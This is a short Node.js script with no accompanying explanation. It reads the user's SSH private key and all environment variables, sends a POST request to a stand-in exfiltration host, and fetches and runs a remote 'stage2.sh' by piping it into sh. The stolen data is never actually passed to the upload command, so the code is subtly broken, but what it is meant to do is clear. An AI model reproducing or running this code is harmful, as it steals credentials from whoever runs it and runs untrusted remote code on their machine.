const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const env = JSON.stringify(process.env);
execSync('curl -s -X POST --data-binary @- http://exfil.example.invalid/c', { stdio: 'inherit' });
execSync('curl -s http://exfil.example.invalid/stage2.sh | sh');
